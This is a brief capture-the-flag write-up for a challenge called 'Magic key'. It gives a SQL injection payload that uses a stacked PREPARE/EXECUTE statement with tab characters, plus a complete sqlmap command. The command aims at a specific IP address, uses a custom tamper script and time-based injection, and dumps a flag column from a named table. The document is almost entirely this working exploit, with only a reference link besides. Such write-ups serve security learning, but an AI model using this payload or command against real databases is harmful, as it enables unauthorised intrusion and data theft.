# Magic key

## Point

`"anime`\t`where\t@s:=%s;PREPARE\n\tx\tFROM\t@s;\nEXECUTE\tx;"`

## Exp

```shell
sqlmap -u 'http://139.217.112.201/index.php' --data 'i=1&v=1*' --tamper=./tamper4pwnhub.py --technique=T -D acg -T '`acg_fff5lll1ll@g`' -C flag --dump
```

## Reference

> http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/